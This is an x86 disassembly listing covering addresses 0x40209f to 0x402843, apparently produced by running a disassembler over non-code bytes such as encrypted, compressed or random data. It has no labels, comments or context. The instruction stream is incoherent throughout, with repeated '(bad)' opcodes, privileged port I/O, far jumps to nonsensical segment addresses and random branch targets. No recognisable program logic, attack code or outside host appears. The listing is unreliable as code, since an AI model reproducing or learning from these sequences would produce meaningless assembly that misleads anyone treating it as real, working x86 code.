  40209f:	add    DWORD PTR [esi-0xa60dc87],esp
  4020a5:	mov    edi,0xe986c431
  4020aa:	jo     0x4020ca
  4020ac:	sbb    edi,DWORD PTR [ecx+ebx*1+0x61]
  4020b0:	cmp    bh,BYTE PTR [ebx-0x3a]
  4020b3:	xchg   ecx,eax
  4020b4:	push   ss
  4020b5:	scas   eax,DWORD PTR es:[edi]
  4020b6:	and    al,0x45
  4020b8:	test   ecx,ecx
  4020ba:	dec    ebp
  4020bb:	imul   ebp,DWORD PTR [eax],0xffffff96
  4020be:	addr16 ss pop ds
  4020c1:	les    edx,FWORD PTR [ebx-0x73]
  4020c4:	xor    al,0x92
  4020c6:	xchg   esp,eax
  4020c7:	out    dx,eax
  4020c8:	jle    0x402077
  4020ca:	in     eax,dx
  4020cb:	jg     0x402064
  4020cd:	dec    esp
  4020ce:	mov    cl,0xaf
  4020d0:	inc    eax
  4020d1:	in     al,0xc6
  4020d3:	xor    BYTE PTR [eax+0x41be50d6],dh
  4020d9:	dec    esi
  4020da:	or     eax,0x6aa26eb2
  4020df:	int    0x24
  4020e1:	xchg   ebx,eax
  4020e2:	jmp    0x4020f1
  4020e4:	fisubr WORD PTR [edx+0x73]
  4020e7:	inc    eax
  4020e8:	inc    ecx
  4020e9:	ret    
  4020ea:	push   edi
  4020eb:	sti    
  4020ec:	xchg   edi,eax
  4020ed:	outs   dx,DWORD PTR ds:[esi]
  4020ee:	jne    0x40216d
  4020f0:	into   
  4020f1:	mov    edi,0x88482c31
  4020f6:	retf   
  4020f7:	jge    0x402122
  4020f9:	pop    edx
  4020fa:	je     0x40211b
  4020fc:	cs inc esp
  4020fe:	pop    ds
  4020ff:	pop    es
  402100:	mov    cl,0x28
  402102:	(bad)
  402105:	ss xchg ebp,eax
  402107:	inc    ecx
  402108:	div    DWORD PTR [edi]
  40210a:	ret    0x205b
  40210d:	mov    eax,ds:0x1a77c4c4
  402112:	pop    ss
  402113:	stc    
  402114:	push   ecx
  402115:	arpl   WORD PTR [edx+0x50],ax
  402118:	jmp    0xe515ba1b
  40211d:	xor    DWORD PTR [esi+0x3d],edx
  402120:	aad    0xb0
  402122:	adc    bh,al
  402124:	shl    BYTE PTR [ecx+esi*8],0x63
  402128:	aad    0x76
  40212a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40212b:	jmp    DWORD PTR ds:0xfaa2d5bc
  402131:	fiadd  DWORD PTR ds:0x533a6ed1
  402137:	inc    eax
  402138:	cmp    dl,BYTE PTR [esi-0x43ce8ee0]
  40213e:	sbb    eax,0x536e0bdc
  402143:	(bad)  
  402144:	cmp    eax,0x97ca2c15
  402149:	test   BYTE PTR [eax],ch
  40214b:	xor    DWORD PTR [ebx+0x35],edi
  40214e:	out    dx,al
  40214f:	dec    esi
  402150:	inc    ebx
  402151:	outs   dx,BYTE PTR ds:[esi]
  402152:	jno    0x4020f6
  402154:	imul   ebp,DWORD PTR [edi+0x49db7b6f],0xfbbf8993
  40215e:	div    BYTE PTR [eax+0x38]
  402161:	inc    edx
  402162:	mov    ah,0x26
  402164:	xor    al,ah
  402166:	lea    ebp,[eax]
  402168:	daa    
  402169:	test   al,0x6c
  40216b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40216c:	add    DWORD PTR [eax+esi*4+0x7b],ebx
  402170:	mov    cl,0x4e
  402172:	dec    eax
  402173:	mov    ch,0xa9
  402175:	mov    ah,0x7d
  402177:	mov    ebp,DWORD PTR [edx+esi*2+0x67a73ae6]
  40217e:	add    eax,0x1bcee51b
  402183:	fadd   DWORD PTR ds:0x12fb492f
  402189:	jg     0x4021b0
  40218b:	sahf   
  40218c:	in     al,0x18
  40218e:	mov    ecx,esp
  402190:	(bad)  
  402191:	in     al,0xf1
  402193:	add    al,0xf2
  402195:	inc    edx
  402196:	sbb    cl,BYTE PTR [edi-0x17]
  402199:	jp     0x402140
  40219b:	fwait
  40219c:	dec    ebp
  40219d:	xchg   ebp,eax
  40219e:	lahf   
  40219f:	sbb    al,0x83
  4021a1:	mov    DWORD PTR [esi+0xa1490b4],ebp
  4021a7:	scas   eax,DWORD PTR es:[edi]
  4021a8:	(bad)  
  4021a9:	(bad)  
  4021aa:	cmp    al,0x66
  4021ac:	lea    ebp,[edi+0x58]
  4021af:	je     0x402193
  4021b1:	(bad)  
  4021b3:	sub    DWORD PTR [edx-0x8a4cf47],esp
  4021b9:	call   0xb16d:0xba30bb5c
  4021c0:	aaa    
  4021c1:	test   DWORD PTR [esi-0x136413a2],edx
  4021c7:	retf   0x8863
  4021ca:	and    BYTE PTR [ebx+0x79],bh
  4021cd:	sbb    al,0x72
  4021cf:	scas   al,BYTE PTR es:[edi]
  4021d0:	mov    ebp,0x1897099d
  4021d5:	pop    ss
  4021d6:	test   BYTE PTR [ebx+0x8],al
  4021d9:	and    al,BYTE PTR [esi+0x6b9e179a]
  4021df:	int    0xdb
  4021e1:	sub    cl,BYTE PTR [edi]
  4021e3:	sub    bl,BYTE PTR [edi+ebx*8+0x12]
  4021e7:	jne    0x402223
  4021e9:	(bad)  
  4021ea:	cmp    esi,DWORD PTR [ecx+0x13f37a0]
  4021f0:	cmp    ecx,DWORD PTR [ecx-0x66]
  4021f3:	popf   
  4021f4:	nop
  4021f5:	jmp    0xd378:0xb0d2f7c7
  4021fc:	xor    BYTE PTR [edi+0x3e],0x10
  402200:	jo     0x4021a6
  402202:	cmc    
  402203:	xchg   esi,eax
  402204:	jmp    0xe70d6b26
  402209:	(bad)  
  40220a:	aam    0x7c
  40220c:	retf   0xf3d5
  40220f:	mov    eax,0x3283126a
  402214:	popf   
  402215:	jae    0x4021af
  402217:	adc    DWORD PTR [esi],ebp
  402219:	add    al,0xc6
  40221b:	sbb    eax,0x4c6c136b
  402220:	xor    al,0xdf
  402222:	lods   eax,DWORD PTR ds:[esi]
  402223:	pusha  
  402224:	xor    al,0xaa
  402226:	jne    0x40227a
  402228:	dec    ebp
  402229:	xchg   DWORD PTR [eax],ebp
  40222b:	div    bh
  40222d:	call   0x94fb677
  402232:	shl    BYTE PTR [ecx+ebp*2+0x63],cl
  402236:	add    ebp,DWORD PTR [ecx]
  402238:	inc    ecx
  402239:	mov    bh,0x9
  40223b:	icebp  
  40223c:	sbb    ecx,edi
  40223e:	out    0x63,eax
  402240:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402242:	adc    DWORD PTR [ebp+0x7b47a985],edi
  402248:	pop    eax
  402249:	test   eax,0x33bb04d1
  40224e:	cli    
  40224f:	bound  esp,QWORD PTR [edx]
  402251:	jp     0x40224b
  402253:	sti    
  402254:	std    
  402255:	mov    esi,0x7b10743e
  40225a:	cmp    bh,bl
  40225c:	sub    cl,BYTE PTR [edx+0x1d]
  40225f:	scas   al,BYTE PTR es:[edi]
  402260:	mov    ecx,0x98cbd4c6
  402265:	div    BYTE PTR [eax-0x6f]
  402268:	jns    0x402238
  40226a:	rcl    BYTE PTR [ebx-0x4b],0x24
  40226e:	adc    eax,0x7cb4e959
  402273:	mov    ah,0x2e
  402275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402276:	cmp    BYTE PTR ds:0xcf736966,ah
  40227c:	pop    ebx
  40227d:	stos   BYTE PTR es:[edi],al
  40227e:	mov    eax,edi
  402280:	nop
  402281:	loop   0x402282
  402283:	(bad)  
  402284:	dec    edi
  402285:	call   0xe184db59
  40228a:	xchg   esi,eax
  40228b:	xchg   edx,eax
  40228c:	push   edx
  40228d:	stc    
  40228e:	out    0x15,eax
  402290:	and    dl,BYTE PTR [edi+0x2d]
  402293:	sub    eax,0xc2c3a4d4
  402298:	mov    ah,0x3a
  40229a:	outs   dx,BYTE PTR ds:[esi]
  40229b:	test   eax,0x9b4b9afe
  4022a0:	jb     0x4022bb
  4022a2:	test   eax,0x7af97b41
  4022a7:	mov    dl,BYTE PTR [ebp-0x16]
  4022aa:	pushf  
  4022ab:	int3   
  4022ac:	sub    al,0xf1
  4022ae:	leave  
  4022af:	aam    0x7a
  4022b1:	aas    
  4022b2:	lock dec ebp
  4022b4:	sbb    eax,0x310a3b8e
  4022b9:	fidiv  DWORD PTR [esi]
  4022bb:	push   esp
  4022bc:	sbb    al,0x1
  4022be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022bf:	mov    cl,ah
  4022c1:	retf   0x2921
  4022c4:	fwait
  4022c5:	lods   eax,DWORD PTR ds:[esi]
  4022c6:	iret   
  4022c7:	or     eax,0x7d13ebe1
  4022cc:	sbb    eax,0x34fe51dd
  4022d1:	dec    ebx
  4022d2:	jg     0x402335
  4022d4:	fsub   st(2),st
  4022d6:	popa   
  4022d7:	jl     0x40231d
  4022d9:	fs jb  0x402305
  4022dc:	ret    
  4022dd:	inc    ebp
  4022de:	mov    dl,0x27
  4022e0:	mov    eax,0x9d2134a
  4022e5:	sbb    ebp,DWORD PTR [ebx-0x59389da8]
  4022eb:	fdiv   DWORD PTR [ebp-0x59]
  4022ee:	lods   eax,DWORD PTR ds:[esi]
  4022ef:	scas   al,BYTE PTR es:[edi]
  4022f0:	cmp    edx,DWORD PTR ds:0x195e2b2f
  4022f6:	daa    
  4022f7:	popf   
  4022f8:	int    0xa4
  4022fa:	inc    esi
  4022fb:	sub    eax,0x192a8f69
  402300:	add    DWORD PTR [esi+0x7ac22a07],0x3e463cda
  40230a:	les    ebx,FWORD PTR [eax-0x17799a85]
  402310:	add    DWORD PTR [edx-0x37165429],ebp
  402316:	ja     0x40234a
  402318:	mov    ds:0x9c3ab944,eax
  40231d:	push   edx
  40231e:	test   BYTE PTR [edx],dl
  402320:	mov    dh,0x7
  402322:	inc    eax
  402323:	shl    bl,0xad
  402326:	mov    ah,ch
  402328:	icebp  
  402329:	xchg   ebp,eax
  40232a:	das    
  40232b:	dec    esi
  40232c:	sub    bl,BYTE PTR [ebx]
  40232e:	xor    bh,BYTE PTR [esi]
  402330:	push   ecx
  402331:	jo     0x4022be
  402333:	jmp    0x40233e
  402335:	fsub   DWORD PTR [ebx+0x4862ccb4]
  40233b:	pusha  
  40233c:	sbb    eax,0xb881869
  402341:	sub    al,0x66
  402343:	pop    eax
  402344:	scas   eax,DWORD PTR es:[edi]
  402345:	sub    DWORD PTR [eax],ecx
  402347:	daa    
  402348:	mov    dh,0xa3
  40234a:	pop    ebp
  40234b:	xchg   ecx,eax
  40234c:	pop    edi
  40234d:	mov    ch,BYTE PTR [ebx]
  40234f:	aad    0x52
  402351:	sub    cl,BYTE PTR [ebx+0xa3f6cfa]
  402357:	pop    DWORD PTR [ebx+0x72]
  40235a:	shl    ecx,1
  40235c:	sbb    esp,ecx
  40235e:	loopne 0x4023d7
  402360:	inc    esi
  402361:	adc    al,0xe9
  402363:	dec    esi
  402364:	pop    edx
  402365:	cmp    cl,BYTE PTR [ebx]
  402367:	inc    esp
  402368:	xchg   BYTE PTR [eax+0x7e],cl
  40236b:	mov    edx,0xe8fefe70
  402370:	icebp  
  402371:	ret    0xc316
  402374:	outs   dx,DWORD PTR ds:[esi]
  402375:	ret    
  402376:	cld    
  402377:	stos   BYTE PTR es:[edi],al
  402378:	push   ebx
  402379:	call   0xeabf:0x39b1f6e2
  402380:	scas   al,BYTE PTR es:[edi]
  402381:	adc    eax,0xcd94f62c
  402386:	push   edi
  402387:	(bad)  
  402388:	in     al,dx
  402389:	or     DWORD PTR ds:0x889a8f56,0xadb0497f
  402393:	xor    eax,0x9bb3500a
  402398:	push   edi
  402399:	addr16 in al,dx
  40239b:	popa   
  40239c:	and    eax,0x98ba7130
  4023a1:	outs   dx,DWORD PTR ds:[esi]
  4023a2:	or     al,0x2f
  4023a4:	inc    edi
  4023a5:	xchg   edi,eax
  4023a6:	mov    eax,0xd427eedd
  4023ab:	mov    al,ds:0x9cea73fe
  4023b0:	fist   WORD PTR [ebx+0x5f]
  4023b3:	mov    al,0x31
  4023b5:	mov    edx,0xb6a55365
  4023ba:	jo     0x402385
  4023bc:	js     0x40238f
  4023be:	adc    dl,BYTE PTR [edi]
  4023c0:	push   es
  4023c1:	in     al,dx
  4023c2:	ins    DWORD PTR es:[edi],dx
  4023c3:	jbe    0x4023ef
  4023c5:	and    esp,esp
  4023c7:	pop    esp
  4023c8:	adc    ebp,DWORD PTR [ecx-0x55]
  4023cb:	pop    edi
  4023cc:	mov    cl,0x70
  4023ce:	xor    eax,0xd1b72542
  4023d3:	adc    edi,DWORD PTR [eax+0x32]
  4023d6:	push   ecx
  4023d7:	or     esp,ecx
  4023d9:	or     al,0x21
  4023db:	or     ebp,DWORD PTR [ebx-0x1b]
  4023de:	inc    eax
  4023df:	and    edx,esi
  4023e1:	fs inc edx
  4023e3:	jo     0x4023f2
  4023e5:	aam    0xcf
  4023e7:	jo     0x4023dc
  4023e9:	pop    ecx
  4023ea:	ss pop es
  4023ec:	(bad)  
  4023ed:	retf   0xdd6e
  4023f0:	cmp    eax,DWORD PTR [edx-0x2f094d99]
  4023f6:	call   0x40e593a1
  4023fb:	pop    edx
  4023fc:	out    0xd4,al
  4023fe:	sbb    ecx,ebp
  402400:	adc    al,0x8
  402402:	push   ebx
  402403:	test   BYTE PTR [ecx-0x5d8f66f1],cl
  402409:	lods   al,BYTE PTR ds:[esi]
  40240a:	sbb    dh,BYTE PTR [esi]
  40240c:	mov    edx,0x790e0a76
  402411:	fadd   st(6),st
  402413:	(bad)  
  402414:	test   al,0xcd
  402416:	jp     0x40245d
  402418:	mov    ch,0x87
  40241a:	add    al,0xa1
  40241c:	cmp    DWORD PTR [ebp+0x21741450],esi
  402422:	cmp    al,dl
  402424:	pop    ds
  402425:	leave  
  402426:	lock jecxz 0x4023ea
  402429:	sub    eax,0x3bde32aa
  40242e:	dec    ecx
  40242f:	stos   BYTE PTR es:[di],al
  402431:	fimul  WORD PTR [edi]
  402433:	sub    BYTE PTR [esi-0x3b423ee7],0x9f
  40243a:	sub    ah,BYTE PTR [esi-0x1cc98459]
  402440:	hlt    
  402441:	mov    dh,bl
  402443:	mov    eax,ds:0x1c279aee
  402448:	out    0x96,al
  40244a:	mov    edi,0xff27e283
  40244f:	mov    dl,0x20
  402451:	mov    ecx,0x93db763a
  402456:	lea    eax,[edx+0x48378034]
  40245c:	and    BYTE PTR [ebp+ebp*2-0x8],ch
  402460:	sub    DWORD PTR [ebp*1+0x387f366a],eax
  402467:	(bad)  
  402468:	out    dx,al
  402469:	adc    eax,DWORD PTR [ecx-0x1f]
  40246c:	fs xor bh,ah
  40246f:	out    0xcc,al
  402471:	bound  ecx,QWORD PTR [edi+0x45]
  402474:	mov    BYTE PTR [ecx],bh
  402476:	(bad)  
  402477:	jp     0x402483
  402479:	xor    edi,DWORD PTR [edi]
  40247b:	sub    dl,BYTE PTR [edx-0x4c73adc4]
  402481:	out    0xa3,eax
  402483:	int3   
  402484:	inc    ebx
  402485:	ret    
  402486:	leave  
  402487:	mov    ebp,0x8342198d
  40248c:	arpl   si,sp
  40248e:	add    al,0xf8
  402491:	stos   BYTE PTR es:[edi],al
  402492:	lds    esi,FWORD PTR [edi+ebp*4+0x31]
  402496:	xlat   BYTE PTR ds:[ebx]
  402497:	cmp    bl,dl
  402499:	push   ebx
  40249a:	(bad)  
  40249b:	ds mov bh,0x52
  40249e:	add    esi,esp
  4024a0:	test   eax,0x8aca32f9
  4024a5:	pop    esp
  4024a6:	cmp    BYTE PTR [edx],cl
  4024a8:	sub    al,0x66
  4024aa:	adc    DWORD PTR [ebx-0x4d],0x26aa32e2
  4024b1:	sub    dh,0x51
  4024b4:	fxch   st(4)
  4024b6:	ja     0x402449
  4024b8:	scas   al,BYTE PTR es:[edi]
  4024b9:	pop    bx
  4024bb:	jmp    0x5ce1d9e5
  4024c0:	fwait
  4024c1:	aas    
  4024c2:	loope  0x402521
  4024c4:	daa    
  4024c5:	mov    bl,0x1c
  4024c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024c8:	cmp    ecx,DWORD PTR [eax]
  4024ca:	add    bl,al
  4024cc:	add    BYTE PTR [eax-0x4b],cl
  4024cf:	add    edi,ebp
  4024d1:	dec    eax
  4024d2:	or     DWORD PTR [eax],edx
  4024d4:	inc    ecx
  4024d5:	(bad)  
  4024d6:	jge    0x4024da
  4024d8:	add    BYTE PTR [ebx+0x33380b1c],bh
  4024de:	cmp    eax,0xda31bc9c
  4024e3:	retf   
  4024e4:	mov    esi,0x2caa2f7e
  4024e9:	xchg   ebx,eax
  4024ea:	jge    0x402506
  4024ec:	mov    bh,0x96
  4024ee:	sbb    BYTE PTR [ebx+0x5204be34],0x83
  4024f5:	xor    ch,BYTE PTR [edi+0x2f]
  4024f8:	mov    ah,0x35
  4024fa:	loopne 0x4024fe
  4024fc:	xlat   BYTE PTR ds:[ebx]
  4024fd:	bsr    ebx,DWORD PTR [edi+0x2153755a]
  402504:	push   esp
  402505:	inc    bx
  402507:	mov    cl,0xa7
  402509:	cmp    al,0x90
  40250b:	mov    ch,0x64
  40250d:	push   ebx
  40250e:	lea    ecx,[edi-0x7e9180af]
  402514:	jne    0x4024e2
  402516:	scas   eax,DWORD PTR es:[edi]
  402517:	ficom  WORD PTR [eax+esi*2]
  40251a:	lea    ebx,[ebx+0x3080aa0c]
  402520:	xor    ah,BYTE PTR ds:0xcfb668c
  402526:	mov    DWORD PTR [edi],edx
  402528:	or     al,0x5b
  40252a:	dec    ecx
  40252b:	or     eax,0x2da38fca
  402530:	ja     0x40258e
  402532:	(bad)  
  402533:	xchg   esi,eax
  402534:	dec    eax
  402535:	mov    ecx,DWORD PTR [edi-0x79052ea6]
  40253b:	cdq    
  40253c:	xchg   edx,eax
  40253d:	(bad)  
  40253e:	lock out 0x71,al
  402541:	push   ss
  402542:	lods   eax,DWORD PTR ds:[esi]
  402543:	std    
  402544:	dec    edx
  402545:	js     0x402581
  402547:	mov    ah,0xdf
  402549:	adc    DWORD PTR ds:0x9fb54d90,edi
  40254f:	add    eax,ecx
  402551:	mov    edi,DWORD PTR [ebx+edx*2-0x35]
  402555:	dec    eax
  402556:	(bad)  
  402557:	dec    esi
  402558:	sbb    cl,ah
  40255a:	enter  0xf4a,0x4f
  40255e:	ret    
  40255f:	jns    0x402592
  402561:	adc    al,0x63
  402563:	push   edi
  402564:	push   es
  402565:	(bad)  
  402566:	jns    0x402528
  402568:	jmp    0xabce:0xa76a46c7
  40256f:	lahf   
  402570:	clc    
  402571:	mov    ecx,0x2a0c7ba
  402576:	into   
  402577:	out    0xd1,eax
  402579:	sti    
  40257a:	jmp    0x4025ac
  40257c:	pop    esp
  40257d:	sar    DWORD PTR [esi-0x47],1
  402580:	add    al,0x83
  402582:	test   al,0xe2
  402584:	push   ds
  402585:	adc    dl,cl
  402587:	pop    ebp
  402588:	xchg   ebp,eax
  402589:	xchg   ecx,eax
  40258a:	xor    ecx,esi
  40258c:	inc    esp
  40258d:	sub    dl,BYTE PTR [ecx+0x4d979ac3]
  402593:	mov    ah,0xa3
  402595:	add    DWORD PTR [edx],edi
  402597:	test   BYTE PTR [ebp+0x54656196],bl
  40259d:	adc    eax,0xd88ee7c5
  4025a2:	xchg   edi,eax
  4025a3:	test   DWORD PTR [esi],edx
  4025a5:	ret    0xbd19
  4025a8:	jl     0x4025e1
  4025aa:	xor    ch,BYTE PTR [edx+0x6e]
  4025ad:	cld    
  4025ae:	and    al,0xd
  4025b0:	ins    BYTE PTR es:[edi],dx
  4025b1:	jp     0x40258d
  4025b3:	iret   
  4025b4:	push   cs
  4025b5:	sub    al,0xc
  4025b7:	mov    dh,0x56
  4025b9:	icebp  
  4025ba:	repz push ecx
  4025bc:	into   
  4025bd:	test   eax,0x255c604
  4025c2:	cdq    
  4025c3:	push   edi
  4025c4:	sub    DWORD PTR [esi],edi
  4025c6:	xchg   ecx,eax
  4025c7:	push   edx
  4025c8:	addr16 (bad) 
  4025cb:	dec    ebp
  4025cc:	cmp    eax,0x5f5f0ccf
  4025d1:	and    cl,BYTE PTR [edx-0x14778737]
  4025d7:	push   edx
  4025d8:	mov    ds:0x8f3f782c,eax
  4025dd:	push   cs
  4025de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025df:	mov    edi,0xf91155df
  4025e4:	mov    ebp,0xa1446ea0
  4025e9:	sub    eax,0xa1193c6c
  4025ee:	sbb    DWORD PTR [ebp-0x72],0x5b
  4025f2:	add    eax,0x68cb2655
  4025f7:	stc    
  4025f8:	add    bl,BYTE PTR [eax+0x2df509db]
  4025fe:	int3   
  4025ff:	dec    ecx
  402600:	stos   DWORD PTR es:[edi],eax
  402601:	mov    esp,DWORD PTR ds:0x7d755341
  402607:	psubsw mm3,QWORD PTR [ecx-0x4d]
  40260b:	and    al,0x8c
  40260d:	imul   eax,DWORD PTR [ebx+0x662cbecc],0xe6b444fa
  402617:	icebp  
  402618:	inc    edi
  402619:	bound  ebx,QWORD PTR [edi]
  40261b:	push   0x3f6dfa65
  402620:	push   edx
  402621:	nop
  402622:	fimul  DWORD PTR [edi]
  402624:	int    0x1f
  402626:	sbb    BYTE PTR [ecx+esi*2+0x52],cl
  40262a:	jnp    0x40264c
  40262c:	push   0xffffffc6
  40262e:	fnstenv [edx-0x80]
  402631:	push   ebp
  402632:	add    ah,BYTE PTR [edx]
  402634:	dec    ecx
  402635:	in     al,0x65
  402637:	repz (bad) 
  402639:	fst    QWORD PTR [ebp-0x79]
  40263c:	sbb    eax,0x7253edf6
  402641:	call   0x3c65:0x9f55952e
  402648:	and    al,0x3
  40264a:	sub    ch,BYTE PTR [edx]
  40264c:	mov    BYTE PTR [ebp+0xf],ch
  40264f:	jnp    0x402620
  402651:	test   al,0xfa
  402653:	cli    
  402654:	mov    edi,0xdd6b7b89
  402659:	push   esi
  40265a:	mov    eax,DWORD PTR [eax+0x36747b35]
  402660:	adc    edx,ebp
  402662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402663:	push   edi
  402664:	inc    esi
  402665:	inc    esi
  402666:	mov    ch,0xf5
  402668:	popf   
  402669:	sbb    al,0xc
  40266b:	iret   
  40266c:	outs   dx,BYTE PTR ds:[esi]
  40266d:	push   DWORD PTR [edx-0x26250276]
  402673:	jg     0x40262c
  402675:	push   edx
  402676:	js     0x4026e0
  402678:	aas    
  402679:	stos   DWORD PTR es:[edi],eax
  40267a:	push   0xd
  40267c:	inc    esi
  40267d:	xor    esp,eax
  40267f:	retf   
  402680:	into   
  402681:	(bad)  
  402682:	pop    eax
  402683:	sbb    bh,BYTE PTR [eax-0x67]
  402686:	repz bound ebx,QWORD PTR [ecx+ebp*2]
  40268a:	jle    0x40264f
  40268c:	cmp    al,0x61
  40268e:	shl    BYTE PTR [edx+0x65c1f294],0x42
  402695:	js     0x402646
  402697:	adc    al,0x59
  402699:	jns    0x4026f3
  40269b:	pop    edi
  40269c:	lods   eax,DWORD PTR ds:[esi]
  40269d:	sar    DWORD PTR ds:0x8b3a3cfb,1
  4026a3:	loope  0x40269c
  4026a5:	jmp    0xfe37:0xeb61f911
  4026ac:	cmp    eax,0x885ac0f4
  4026b1:	ret    0x1fa9
  4026b4:	or     DWORD PTR [ebx-0x6b66406e],ebp
  4026ba:	jne    0x402728
  4026bc:	xrelease mov DWORD PTR [edx],0xc1b43a34
  4026c3:	jg     0x402670
  4026c5:	pop    es
  4026c6:	sahf   
  4026c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026c8:	scas   al,BYTE PTR es:[edi]
  4026c9:	vhaddps xmm3,xmm1,XMMWORD PTR [eax-0x62]
  4026ce:	mov    ds:0x86750afa,eax
  4026d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026d4:	popa   
  4026d5:	pop    ebp
  4026d6:	cmp    al,0x0
  4026d8:	add    ebx,0x4a
  4026db:	jmp    0xab40:0xfa6e308f
  4026e2:	push   0x21a5f51b
  4026e7:	test   al,0x8d
  4026e9:	fmul   QWORD PTR [ebp+0x5bbddd84]
  4026ef:	aaa    
  4026f0:	jecxz  0x402724
  4026f2:	stos   BYTE PTR es:[edi],al
  4026f3:	or     al,0xc6
  4026f5:	jmp    0x40268a
  4026f7:	out    dx,al
  4026f8:	mov    al,ds:0x6f3eb8cd
  4026fd:	ret    
  4026fe:	dec    edi
  4026ff:	jmp    0x4026bb
  402701:	xor    ch,ch
  402703:	sti    
  402704:	jg     0x402694
  402706:	loopne 0x4026eb
  402708:	sbb    al,0xcb
  40270a:	push   edi
  40270b:	xchg   edx,eax
  40270c:	jg     0x402763
  40270e:	cmp    ah,BYTE PTR [ebp-0x77]
  402711:	mov    al,0x88
  402713:	sbb    eax,esi
  402715:	dec    eax
  402716:	jle    0x402727
  402718:	xchg   BYTE PTR [ecx],ah
  40271a:	ins    BYTE PTR es:[edi],dx
  40271b:	rol    BYTE PTR [edi],cl
  40271d:	cmp    edx,0xffffffbe
  402720:	add    al,0x2f
  402722:	mov    eax,0xf921f369
  402727:	fldpi  
  402729:	mov    ch,0x20
  40272b:	stos   DWORD PTR es:[edi],eax
  40272c:	inc    ebp
  40272d:	cwde   
  40272e:	mov    eax,0x2657d288
  402733:	shr    DWORD PTR [edi-0x29],cl
  402736:	pop    ecx
  402737:	xor    esi,DWORD PTR [edx+0x16]
  40273a:	daa    
  40273b:	fisub  DWORD PTR [eax+0x20400d5a]
  402741:	xchg   esp,eax
  402742:	push   edx
  402743:	mov    eax,ds:0x20ffef15
  402748:	jmp    0x4026e3
  40274a:	ret    0xe521
  40274d:	stos   BYTE PTR es:[edi],al
  40274e:	adc    al,0xd0
  402750:	(bad)  
  402751:	mov    esp,0x2c2e3352
  402756:	mov    cl,dl
  402758:	mov    eax,ds:0x845ed572
  40275d:	imul   edi,ebp,0x2d
  402760:	and    DWORD PTR ds:0xf82b8c9e,esi
  402766:	popf   
  402767:	jecxz  0x402733
  402769:	add    al,0x81
  40276b:	cmp    dh,al
  40276d:	add    DWORD PTR [ebx],edx
  40276f:	lods   eax,DWORD PTR ds:[esi]
  402770:	sub    BYTE PTR [edi-0x47a97e5],ch
  402776:	out    0xdc,al
  402778:	inc    ebx
  402779:	les    edx,FWORD PTR [eax+0x33]
  40277c:	fwait
  40277d:	out    0x1f,al
  40277f:	out    dx,eax
  402780:	and    al,0x78
  402782:	mov    al,0xc
  402784:	das    
  402785:	dec    eax
  402786:	loope  0x40275a
  402788:	aaa    
  402789:	div    bh
  40278b:	dec    ecx
  40278c:	cld    
  40278d:	mov    dl,0x76
  40278f:	mov    BYTE PTR [edx-0x32b8eda0],0x17
  402796:	mov    edx,DWORD PTR [eax+0x4a]
  402799:	pop    edi
  40279a:	add    BYTE PTR [ecx],ah
  40279c:	dec    ecx
  40279d:	inc    eax
  40279e:	mov    ah,0x4d
  4027a0:	(bad)  
  4027a1:	mov    esp,0x3c108cee
  4027a6:	cli    
  4027a7:	mov    dl,0x8d
  4027a9:	clc    
  4027aa:	jne    0x4027f2
  4027ac:	aaa    
  4027ad:	or     eax,0x7cdd4c49
  4027b2:	pop    esp
  4027b3:	dec    ebx
  4027b4:	xchg   eax,edi
  4027b6:	rcl    BYTE PTR [edi],cl
  4027b8:	xor    ebp,DWORD PTR [ebx+0xb9a2504]
  4027be:	add    BYTE PTR [esp+ebp*2],ch
  4027c1:	fwait
  4027c2:	test   BYTE PTR [esi],dh
  4027c4:	out    0x21,eax
  4027c6:	fwait
  4027c7:	pop    ds
  4027c8:	outs   dx,DWORD PTR ds:[esi]
  4027c9:	mov    DWORD PTR [eax-0x29],eax
  4027cc:	ds ss cmp ecx,esi
  4027d0:	pop    ecx
  4027d1:	outs   dx,BYTE PTR ds:[esi]
  4027d2:	push   esi
  4027d3:	sub    al,0xc5
  4027d5:	loope  0x4027ac
  4027d7:	xchg   edx,eax
  4027d8:	jl     0x4027aa
  4027da:	cmp    BYTE PTR [ecx-0x73],cl
  4027dd:	push   esp
  4027de:	xchg   ebp,eax
  4027df:	outs   dx,DWORD PTR ds:[esi]
  4027e0:	mov    bh,0x3b
  4027e2:	mov    ch,0x47
  4027e4:	cmp    ebp,DWORD PTR [ebp+0x61]
  4027e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027e8:	scas   al,BYTE PTR es:[edi]
  4027e9:	lea    eax,[ebx+0x3d]
  4027ec:	pop    ecx
  4027ed:	adc    BYTE PTR [edx],0x30
  4027f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027f1:	sbb    cl,bl
  4027f3:	mov    dl,0xf8
  4027f5:	xchg   BYTE PTR [eax],cl
  4027f7:	je     0x402796
  4027f9:	mov    dh,0xf5
  4027fb:	(bad)  
  4027fc:	sub    edi,DWORD PTR [ecx]
  4027fe:	xchg   edi,eax
  4027ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402800:	out    dx,al
  402801:	and    DWORD PTR [esi+0x2f682159],esp
  402807:	test   al,0x1a
  402809:	lock push esp
  40280b:	leave  
  40280c:	aaa    
  40280d:	mov    bh,0xa0
  40280f:	sub    DWORD PTR [esp+esi*2+0x41],esi
  402813:	test   BYTE PTR [esi],ch
  402815:	(bad)  
  402816:	jno    0x40284f
  402818:	scas   al,BYTE PTR es:[edi]
  402819:	sub    dh,0x6d
  40281c:	mov    al,0x5a
  40281e:	fldcw  WORD PTR [eax]
  402820:	or     DWORD PTR [esi+0x17],0xffffff82
  402824:	push   esi
  402825:	sub    edi,ecx
  402827:	mov    ds:0x28f4add2,eax
  40282c:	xchg   BYTE PTR [eax+0x75d3db89],ah
  402832:	imul   eax,DWORD PTR [ebx],0x53
  402835:	sbb    DWORD PTR [esi],0x402c7c52
  40283b:	mov    ecx,0xa7166a3c
  402840:	clc    
  402841:	jecxz  0x402805
  402843:	ins    BYTE PTR es:[edi],dx
